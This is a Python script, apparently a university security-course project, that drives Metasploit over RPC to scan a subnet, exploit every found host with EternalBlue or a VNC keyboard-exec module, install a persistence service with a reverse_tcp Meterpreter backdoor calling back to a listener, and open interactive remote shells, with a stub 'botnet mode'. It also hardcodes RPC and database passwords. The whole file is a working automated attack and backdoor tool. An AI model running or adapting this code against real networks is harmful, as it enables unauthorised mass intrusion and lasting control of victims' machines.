from pymetasploit3.msfrpc import MsfRpcClient, Workspace, WorkspaceManager, HostsTable, MsfError, MeterpreterSession
from pymetasploit3.msfconsole import MsfRpcConsole
import pandas as pd
import os
import nmap3
import time
import sys
import re
from targetmanager import TargetManager, Target

nmap = nmap3.Nmap()

def perform_scan():
    try:
        subnet = '10.0.2.0/24'
        while subnet == '':
            subnet = input()
        nmap.scan_command(subnet, arg='-O -sV') # TODO SCAN ENTIRE SUBNET
        return nmap.raw_ouput
    except Exception as e:
        print(e)

def exploit_target(console, exploit, payload, options):
    options_str = 'use {}/{}\n'.format('exploit', exploit)
    if payload is not None:
        options_str += 'set PAYLOAD {}\n'.format(payload)

    for option in options:
        options_str += 'set {} {}\n'.format(option[0], option[1])

    options_str += 'run -z\n'

    console.write(options_str)
    data = ''
    while data == '' or console.is_busy():
        time.sleep(1)
        cons_read = console.read()['data']
        out_match = re.match(r'\[[*,+,-]\].*', cons_read)
        if out_match is not None:
            print(cons_read, end='')
        end_match = re.match(r'(.+) (Meterpreter session) (\d{1,2}) opened (.+)', cons_read)
        sys.stdout.flush()
        if end_match:
            return end_match.group(3)
        
        data += cons_read
    
    print()
    return -1

def meterpreter_session(client : MsfRpcClient, target : Target):
    # TODO detect if host is down
    try:
        print('Session creation successful')
        shell : MeterpreterSession = client.sessions.session(target.sid)
        cmd = None
        while True:
            print('>>> ', end='')
            cmd = input()
            if 'exit' in cmd:
                shell.stop()
                target.stop_session()
                break
            elif 'bg' in cmd:
                break
            if 'cd' in cmd:
                shell.runsingle(cmd)
            else:
                print(shell.run_with_output(cmd))
    except MsfError as e:
        print('Stopping shell: ' + str(e))
        shell.stop()

def exit_sessions(client):
    for sid in client.sessions.list.keys():
        print('Stopping session ' + sid)
        client.sessions.session(sid).stop()
    
    for cons in client.consoles.list:
        print('Destroying console ' + cons['id'])
        client.consoles.destroy(cons['id'])  

def set_persistence(console, sid, port):
    options = []
    options.append(['LHOST', '10.0.2.15'])
    options.append(['LPORT', port])
    options.append(['session', sid])

    return exploit_target(console, 'windows/local/persistence_service', None, options)

def perform_exploit(console, tm):
    targets = tm.get_targets_dict()
    # TODO automate exploits
    exploits = ['windows/smb/ms17_010_eternalblue', 'multi/vnc/vnc_keyboard_exec'] 

    for target in targets.keys():
            current_target = targets[target]
            print('\n=====================================')
            print('Trying to exploit: ' + target)
            print('=====================================')
            #TODO IGNORE ALREADY EXPLOITED TARGETS
            if current_target.backdoor == True:
                ## try use the backdoor payload
                print('Target has backdoor')
                ex_sid = exploit_target(console, 'multi/handler', 'windows/meterpreter/reverse_tcp', [['LHOST', '10.0.2.15'], ['LPORT', current_target.backdoor_port]])
                if int(ex_sid) > 0:
                    print('Backdoor Success')
                    current_target.sid = ex_sid
                    current_target.how_exploited = 'Backdoor'
                    continue
                else:
                    print('Backdoor failed')
            
            for exploit in exploits:
                print('-> Using exploit: ' + exploit)
                ex_sid = exploit_target(console, exploit, None, [['RHOSTS', target]])
                
                if int(ex_sid) > 0: # Success
                    print('Success!')
                    current_target.sid = ex_sid
                    current_target.how_exploited = exploit
                    # Add persistence
                    print('=====================================')
                    print('ADDING PERSISTENCE')
                    print('=====================================')
                    bd_port = tm.get_unique_port()

                    p_sid = set_persistence(console, ex_sid, bd_port)
                    if int(p_sid) > 0:
                        tm.set_backdoor(current_target, bd_port)
                        # TODO: KILL THE PERSISTENCE SESSION
                    else:
                        print('Persistence failed')
                    break
                else:
                    print('Exploit failed, trying next...')

# def run_botnet(client, tm : TargetManager):
#     tm.get_targets_df()

#     try:
#         print('Session creation successful')
#         shell : MeterpreterSession = client.sessions.session(sid)
#         cmd = None
#         while cmd != 'exit':
#             print('>>> ', end='')
#             cmd = input()
#             if 'cd' in cmd:
#                 shell.runsingle(cmd)
#             else:
#                 print(shell.run_with_output(cmd))

#     except MsfError as e:
#         print('Error: ' + str(e))


def get_number_input(prompt, upper_bound):
    while True:
        print(prompt)
        print('> ', end='')
        
        try:
            inp = int(input())
            if inp >= 0 and inp <= upper_bound:
                return inp
            else:
                raise ValueError("Invalid input")
        except Exception as e:
            print(e)

def main():
    try:
        client = MsfRpcClient('uDIBkUec')
        print('Initialised MSF RPC client')
        client.db.connect('msf', 'msf', password='mbAfW9rRpXCsOAzkwBQeopVG+vms7b8+LgVhrFGPfEo=')

        scan = get_number_input('Use existing database (0), Perform new scan (1)', 1) == 1

        if scan: 
            wsm = WorkspaceManager(client)
            wsm.remove('cybr471') # remove previous database
            wsm.add('cybr471') # add new database
            print('Database connection established')

            print('Scanning...')
            results = perform_scan()
            print('Scanning Complete')

        workspace = Workspace(client, 'cybr471')
        if scan:
            workspace.importdata(results)
            print('Scan data imported to MSF successfully')

        target_manager = TargetManager(workspace.hosts)
        target_manager.parse_targets_from_host(workspace.hosts.list)
        print('Purge old sessions...')
        exit_sessions(client)

        console = client.consoles.console()
        print('Initialising console...')
        time.sleep(3)

        while True:
            targets_all = target_manager.get_targets_df()
            print('\n===================== All Targets =====================')
            print(targets_all)
            print('=======================================================')

            #######################
            t_select = get_number_input('(0) Exploit vulnerable hosts, (1) Use meterpreter session, (2) Exit', 2)
            if t_select == 0:
                perform_exploit(console, target_manager)
            elif t_select == 1:
                targets_exp = target_manager.get_targets_df(True)
                print('\n================== Exploited Targets ==================')
                print(targets_exp)
                print('=======================================================')

                t_select = get_number_input('Enter session (host #), (0) Botnet mode', len(targets_exp))
                if t_select == 0:
                    print('BOTNET MODE')
                    # shutdown
                    # set
                else:
                    target = target_manager.get_target(targets_exp.loc[t_select]['IP'])
                    meterpreter_session(client, target)
            else:
                break


        ########################
        exit_sessions(client)   

    except Exception as e:
        print('Error: ' + str(e))

if __name__== '__main__':
    main()